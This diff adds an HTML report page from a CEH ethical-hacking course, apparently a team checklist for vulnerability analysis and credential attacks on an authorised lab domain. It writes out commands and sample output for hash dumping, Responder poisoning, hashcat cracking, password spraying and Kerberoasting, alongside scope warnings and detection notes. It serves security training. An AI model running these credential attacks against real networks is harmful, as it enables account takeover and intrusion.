@@ -1,0 +1,264 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Session 04 — Team Vulnerability &amp; Access Report | CEH · ITGate Academy</title>
+<meta name="description" content="CEH Diploma Session 4 team deliverable — an interactive vulnerability-analysis and credential-attack checklist for the authorised lab domain, saved in the browser, exported to HTML or PDF.">
+<link rel="stylesheet" href="../assets/css/ceh.css">
+<link rel="icon" href="../assets/img/itgate-logo.jpg">
+</head>
+<body>
+
+<header class="topbar">
+  <div class="wrap topbar-inner">
+    <a class="brand" href="../index.html">
+      <img src="../assets/img/itgate-logo.jpg" alt="ITGate Academy">
+      <span class="brand-text">
+        <span class="brand-name">ITGate Academy</span>
+        <span class="brand-sub">CEH · Session 04 Report</span>
+      </span>
+    </a>
+    <nav class="topnav">
+      <a href="index.html">Session 4</a>
+      <a href="../index.html">All sessions</a>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap section">
+  <div data-report="s4-access" data-report-title="CEH Session 4 — Team Vulnerability & Access Report">
+
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04</span><span class="tag lab">Team deliverable</span><span class="time">⏱ fill as you work</span></div>
+      <h1>Team Vulnerability &amp; Access Report</h1>
+      <p class="lede">Turn Session 3&rsquo;s services and users into a <strong>way in</strong>. Match versions to weaknesses, then attack authentication on the <strong>authorised lab domain</strong>. Tick each step, paste evidence, click <em>example</em> for what good output looks like. Saves in <strong>this browser</strong>; export to HTML or PDF.</p>
+    </div>
+
+    <div class="rep-head">
+      <h2>Engagement header</h2>
+      <p>Fill this once. It prints at the top of your exported report.</p>
+      <div class="rep-fields">
+        <div class="rep-field"><label>Team name</label><input data-field="team" data-label="Team" placeholder="e.g. Team Nightowl" autocomplete="off"></div>
+        <div class="rep-field"><label>Date</label><input data-field="date" data-label="Date" placeholder="2026-09-01" autocomplete="off"></div>
+        <div class="rep-field wide"><label>Members</label><input data-field="members" data-label="Members" placeholder="Names of everyone on the team" autocomplete="off"></div>
+        <div class="rep-field"><label>Target (in-scope host/domain)</label><input data-field="target" data-label="Target" placeholder="target.com" autocomplete="off"></div>
+        <div class="rep-field"><label>Program / engagement</label><input data-field="program" data-label="Program" placeholder="HackerOne / Bugcrowd / lab engagement" autocomplete="off"></div>
+        <div class="rep-field wide"><label>Scope URL (the policy / authorisation you read)</label><input data-field="scope_url" data-label="Scope URL" placeholder="https://…/security  ·  or the lab authorisation note" autocomplete="off"></div>
+      </div>
+    </div>
+
+    <div class="rep-bar">
+      <div class="rep-prog"><b data-progress>0 / 9 steps</b><span class="pbar"><span data-progress-bar></span></span></div>
+      <div class="rep-actions">
+        <span class="rep-saved" data-saved>saved ✓</span>
+        <button class="rep-btn primary" data-export-html>⭳ Download HTML</button>
+        <button class="rep-btn" data-export-pdf>🖨 Save as PDF</button>
+        <button class="rep-btn ghost" data-clear>Clear</button>
+      </div>
+    </div>
+
+    <div class="rep-gate" data-gate="a1"><b>⚠ Stop.</b> You have ticked an <b>active</b> step but your scope &amp; authorization check (A1) is not signed off. Confirm you are authorised to test this target first — active testing outside an authorised scope is illegal and voids safe harbour.</div>
+
+    <div data-report-body>
+
+      <h3 class="rep-sec">A · Setup &amp; scope — do this first</h3>
+      <div class="rep-step" data-step="a1">
+        <label class="rep-check"><input type="checkbox" data-check="a1"><span class="rep-box"></span></label>
+        <div class="rep-main">
+          <div class="rep-row"><span class="rep-name">Authorization check</span><code class="rep-cmd">confirm you are on the authorised lab domain</code><button class="rep-toggle" aria-expanded="false"></button></div>
+          <div class="rep-detail">
+            <div class="rep-out"><div class="rep-lbl">Example — what authorises a credential attack</div><pre>Authorised targets:  ceh.lab domain — dc, WIN10-TGT01, WIN7-TGT01,
+                     Metasploitable2 (host-only lab network only)
+Allowed:             vuln scan, offline cracking, spray (lockout aware),
+                     Kerberoast, LLMNR poisoning
+Never:               a real bug-bounty target — password attacks are out of
+                     scope on every public program</pre></div>
+            <div class="rep-collect"><div class="rep-lbl">Collect</div><ul>
+              <li>The exact <strong>authorised lab hosts</strong> — nothing outside the lab network</li>
+              <li>That the destructive/loud attacks (spray, poisoning) are <strong>lab-only</strong></li>
+              <li>Lockout policy so a spray does not lock real accounts</li>
+            </ul></div>
+            <div class="rep-why"><b>Why it matters later:</b> credential attacks (spray, Kerberoast, LLMNR poisoning) are <strong>never</strong> authorised on a bug-bounty target — they belong on the lab. This step is the line between a lab exercise and a crime.</div>
+          </div>
+          <textarea class="rep-notes" data-notes="a1" placeholder="Authorised lab hosts: … | Attacks allowed: … | Lockout policy: … | NOT a public target"></textarea>
+        </div>
+      </div>
+      <h3 class="rep-sec">B · Vulnerability analysis</h3>
+      <div class="rep-step" data-step="b1">
+        <label class="rep-check"><input type="checkbox" data-check="b1"><span class="rep-box"></span></label>
+        <div class="rep-main">
+          <div class="rep-row"><span class="rep-name">Version → exploit mapping</span><code class="rep-cmd">searchsploit apache tomcat 8.5.31</code><button class="rep-toggle" aria-expanded="false"></button></div>
+          <div class="rep-detail">
+            <div class="rep-out"><div class="rep-lbl">Example output</div><pre>Apache Tomcat 8.5.31 - ... | multiple/webapps/xxxxx.txt
+... Remote Code Execution ...
+(searchsploit -x <path> to read; -m <id> to copy)</pre></div>
+            <div class="rep-collect"><div class="rep-lbl">Collect</div><ul>
+              <li>For each version from Session 3: <strong>is there a public exploit?</strong></li>
+              <li>Exploit type (RCE / auth-bypass / info-leak) and whether it needs a login</li>
+            </ul></div>
+            <div class="rep-why"><b>Why it matters later:</b> this is the offline half — searchsploit reads a local DB, so it touches nothing. A confirmed public RCE is a top-priority line in your access plan.</div>
+          </div>
+          <textarea class="rep-notes" data-notes="b1" placeholder="Per service+version: public exploit? type? needs creds?…"></textarea>
+        </div>
+      </div>
+      <div class="rep-step" data-step="b2">
+        <label class="rep-check"><input type="checkbox" data-check="b2"><span class="rep-box"></span></label>
+        <div class="rep-main">
+          <div class="rep-row"><span class="rep-name">CVE / CVSS triage</span><code class="rep-cmd">lookup on nvd.nist.gov — record CVE + CVSS base + vector</code><button class="rep-toggle" aria-expanded="false"></button></div>
+          <div class="rep-detail">
+            <div class="rep-out"><div class="rep-lbl">Example output</div><pre>CVE-2020-1938 (Ghostcat, Tomcat AJP)
+CVSS 3.1 base: 9.8 CRITICAL
+vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</pre></div>
+            <div class="rep-collect"><div class="rep-lbl">Collect</div><ul>
+              <li>The <strong>CVE id</strong>, <strong>CVSS base score</strong> and the <strong>vector</strong> (not just the number)</li>
+              <li>Whether it is network-reachable and needs no privileges (the vector tells you)</li>
+            </ul></div>
+            <div class="rep-why"><b>Why it matters later:</b> the score ranks your leads and the vector tells you if it is actually reachable — a 9.8 that needs local access is not your first move.</div>
+          </div>
+          <textarea class="rep-notes" data-notes="b2" placeholder="CVE / CVSS base / vector / reachable?…"></textarea>
+        </div>
+      </div>
+      <div class="rep-step" data-step="b3">
+        <label class="rep-check"><input type="checkbox" data-check="b3" data-active><span class="rep-box"></span></label>
+        <div class="rep-main">
+          <div class="rep-row"><span class="rep-name">Automated vulnerability scan</span><code class="rep-cmd">Nessus Essentials  ·  or  openvas / gvm  (authorised lab hosts)</code><button class="rep-toggle" aria-expanded="false"></button></div>
+          <div class="rep-detail">
+            <div class="rep-out"><div class="rep-lbl">Example output</div><pre>203.0.113.20
+  CRITICAL  Tomcat AJP Ghostcat (CVE-2020-1938)
+  HIGH      SMB signing not required
+  MEDIUM    TLS 1.0 enabled</pre></div>
+            <div class="rep-collect"><div class="rep-lbl">Collect</div><ul>
+              <li>Confirmed findings by <strong>severity</strong>, with the plugin/CVE reference</li>
+              <li>False positives to weed out (cross-check with B1/B2)</li>
+            </ul></div>
+            <div class="rep-why"><b>Why it matters later:</b> the scanner is fast but noisy and wrong sometimes — you confirm its criticals against your own version work before they enter the access plan. It is active, so lab-only.</div>
+          </div>
+          <textarea class="rep-notes" data-notes="b3" placeholder="Critical/High findings + CVE refs + which are confirmed…"></textarea>
+        </div>
+      </div>
+      <h3 class="rep-sec">C · Authentication &amp; password attacks — lab domain only</h3>
+      <div class="rep-step" data-step="c1">
+        <label class="rep-check"><input type="checkbox" data-check="c1" data-active><span class="rep-box"></span></label>
+        <div class="rep-main">
+          <div class="rep-row"><span class="rep-name">Capture / dump hashes</span><code class="rep-cmd">impacket-secretsdump ceh.lab/user@dc  ·  or Responder capture on the wire</code><button class="rep-toggle" aria-expanded="false"></button></div>
+          <div class="rep-detail">
+            <div class="rep-out"><div class="rep-lbl">Example output</div><pre>administrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::
+svc_backup:1104:aad3b...:e19ccf75ee54e06b06a5907af13cef42:::
+[SMB] NTLMv2 hash captured from WIN10-TGT01\m.said</pre></div>
+            <div class="rep-collect"><div class="rep-lbl">Collect</div><ul>
+              <li><strong>NT hashes</strong> (from SAM/NTDS) or <strong>NetNTLMv2</strong> hashes (from the wire)</li>
+              <li>Which account each hash belongs to, and its privilege</li>
+            </ul></div>
+            <div class="rep-why"><b>Why it matters later:</b> hashes are the raw material for C2 cracking and C4 Kerberoast; a captured admin hash may also enable pass-the-hash straight into Session 5.</div>
+          </div>
+          <textarea class="rep-notes" data-notes="c1" placeholder="Hashes captured + account + source (SAM/NTDS/wire)…"></textarea>
+        </div>
+      </div>
+      <div class="rep-step" data-step="c2">
+        <label class="rep-check"><input type="checkbox" data-check="c2" data-active><span class="rep-box"></span></label>
+        <div class="rep-main">
+          <div class="rep-row"><span class="rep-name">Offline cracking</span><code class="rep-cmd">hashcat -m 1000 hashes.txt rockyou.txt   # 1000=NTLM, 5600=NetNTLMv2</code><button class="rep-toggle" aria-expanded="false"></button></div>
+          <div class="rep-detail">
+            <div class="rep-out"><div class="rep-lbl">Example output</div><pre>e19ccf75ee54e06b06a5907af13cef42:Summer2026!
+Status: Cracked  1/4
+svc_backup → Summer2026!</pre></div>
+            <div class="rep-collect"><div class="rep-lbl">Collect</div><ul>
+              <li>Which hashes <strong>cracked</strong>, and the <strong>plaintext</strong></li>
+              <li>The right mode (1000 NTLM · 5600 NetNTLMv2 · 13100 Kerberoast · 1800 sha512crypt)</li>
+            </ul></div>
+            <div class="rep-why"><b>Why it matters later:</b> a cracked service-account password is often domain-wide reuse — it becomes the credential in your access plan and the spray value in C3.</div>
+          </div>
+          <textarea class="rep-notes" data-notes="c2" placeholder="Cracked user:password pairs + hash mode used…"></textarea>
+        </div>
+      </div>
+      <div class="rep-step" data-step="c3">
+        <label class="rep-check"><input type="checkbox" data-check="c3" data-active><span class="rep-box"></span></label>
+        <div class="rep-main">
+          <div class="rep-row"><span class="rep-name">Password spraying</span><code class="rep-cmd">netexec smb dc.ceh.lab -u users.txt -p "Summer2026!" --continue-on-success</code><button class="rep-toggle" aria-expanded="false"></button></div>
+          <div class="rep-detail">
+            <div class="rep-out"><div class="rep-lbl">Example output</div><pre>SMB  dc.ceh.lab  [+] ceh.lab\a.hassan:Summer2026! 
+SMB  dc.ceh.lab  [-] ceh.lab\m.said:Summer2026! (STATUS_LOGON_FAILURE)</pre></div>
+            <div class="rep-collect"><div class="rep-lbl">Collect</div><ul>
+              <li>Accounts where <strong>one password worked</strong> across many users</li>
+              <li>Lockout threshold — <strong>one</strong> password per round, wait out the window</li>
+            </ul></div>
+            <div class="rep-why"><b>Why it matters later:</b> spraying turns one cracked/guessed password into many footholds. Get the lockout math wrong and you lock the domain — which is why A1 recorded the policy.</div>
+          </div>
+          <textarea class="rep-notes" data-notes="c3" placeholder="Valid user:password hits + lockout policy respected…"></textarea>
+        </div>
+      </div>
+      <div class="rep-step" data-step="c4">
+        <label class="rep-check"><input type="checkbox" data-check="c4" data-active><span class="rep-box"></span></label>
+        <div class="rep-main">
+          <div class="rep-row"><span class="rep-name">Kerberoasting</span><code class="rep-cmd">impacket-GetUserSPNs ceh.lab/user -request -dc-ip dc.ceh.lab</code><button class="rep-toggle" aria-expanded="false"></button></div>
+          <div class="rep-detail">
+            <div class="rep-out"><div class="rep-lbl">Example output</div><pre>ServicePrincipalName  Name       
+MSSQL/dc.ceh.lab      svc_sql
+$krb5tgs$23$*svc_sql*... (hash for offline crack, mode 13100)</pre></div>
+            <div class="rep-collect"><div class="rep-lbl">Collect</div><ul>
+              <li><strong>SPN accounts</strong> and their <strong>TGS hashes</strong></li>
+              <li>Feed the hashes to <span class="mono">hashcat -m 13100</span></li>
+            </ul></div>
+            <div class="rep-why"><b>Why it matters later:</b> any domain user can request these tickets — crack one offline and you own a service account, often with high privilege. A top exam and real-world technique.</div>
+          </div>
+          <textarea class="rep-notes" data-notes="c4" placeholder="SPN accounts / TGS hashes captured / cracked?…"></textarea>
+        </div>
+      </div>
+      <div class="rep-step" data-step="c5">
+        <label class="rep-check"><input type="checkbox" data-check="c5" data-active><span class="rep-box"></span></label>
+        <div class="rep-main">
+          <div class="rep-row"><span class="rep-name">LLMNR / NBT-NS poisoning</span><code class="rep-cmd">sudo responder -I eth0 -wv   (lab segment only)</code><button class="rep-toggle" aria-expanded="false"></button></div>
+          <div class="rep-detail">
+            <div class="rep-out"><div class="rep-lbl">Example output</div><pre>[*] Poisoned answer sent to WIN10-TGT01 for name \\fileshare
+[SMB] NTLMv2-SSP Hash captured: m.said::CEH:...
+Saved to Responder logs → crack with -m 5600</pre></div>
+            <div class="rep-collect"><div class="rep-lbl">Collect</div><ul>
+              <li><strong>NetNTLMv2 hashes</strong> captured from broadcast name lookups</li>
+              <li>Which hosts were poisoned and which users</li>
+            </ul></div>
+            <div class="rep-why"><b>Why it matters later:</b> LLMNR/NBT-NS are still on by default in 2026 — poisoning silently harvests hashes that feed C2, closing the loop back to cracking.</div>
+          </div>
+          <textarea class="rep-notes" data-notes="c5" placeholder="Hashes captured via poisoning + hosts/users…"></textarea>
+        </div>
+      </div>
+      <h3 class="rep-sec">D · The deliverable — this is what you submit</h3>
+      <div class="rep-free">
+        <span class="rep-free-label">D1 · Access plan</span>
+        <p class="rep-free-hint">Per host, the chosen way in — the literal input to Session 5 exploitation.</p>
+        <textarea data-notes="d1" placeholder="host | CVE + public exploit? | creds obtained + how | chosen way in
+dc.ceh.lab | Ghostcat CVE-2020-1938 (PoC yes) | svc_backup:Summer2026! (cracked NTLM) | PtH as svc_backup, else Ghostcat
+WIN10-TGT01 | — | m.said NetNTLMv2 (Responder, cracking) | spray reuse"></textarea>
+      </div>
+      <div class="rep-free">
+        <span class="rep-free-label">D2 · Detection note (the SOC flip)</span>
+        <p class="rep-free-hint">What each attack wrote to the auth logs — the tier-1→tier-2 SOC skill.</p>
+        <textarea data-notes="d2" placeholder="Spray → many 4625 (0xC000006A) from one source in a short window
+Kerberoast → 4769 with RC4 (0x17) enc type
+Responder → LLMNR/NBT-NS traffic, logons from an unexpected host"></textarea>
+      </div>
+      <div class="rep-free">
+        <span class="rep-free-label">D3 · Scope statement</span>
+        <p class="rep-free-hint">Confirm this stayed on the authorised lab.</p>
+        <textarea data-notes="d3" placeholder="All vulnerability scanning and credential attacks ran only against the authorised ceh.lab lab hosts on the host-only network. No public/bug-bounty target was touched. Lockout policy was respected during spraying."></textarea>
+      </div>
+    </div>
+
+    <div class="box tip" style="margin-top:22px">
+      <span class="box-t">How your team keeps this</span>
+      <p>This report saves automatically in <strong>the browser you are using now</strong> — reopen the page on the same machine and it is still here. To hand it in or share it between teammates, use <strong>Download HTML</strong> (a single file) or <strong>Save as PDF</strong>. It does not sync between devices on its own.</p>
+    </div>
+
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="wrap footer-inner">
+    <span>CEH Diploma · ITGate Academy · Session 4 team deliverable</span>
+    <span><a href="index.html">← Back to Session 4</a></span>
+  </div>
+</footer>
+
+<script src="../assets/js/report.js"></script>
+</body>
+</html>
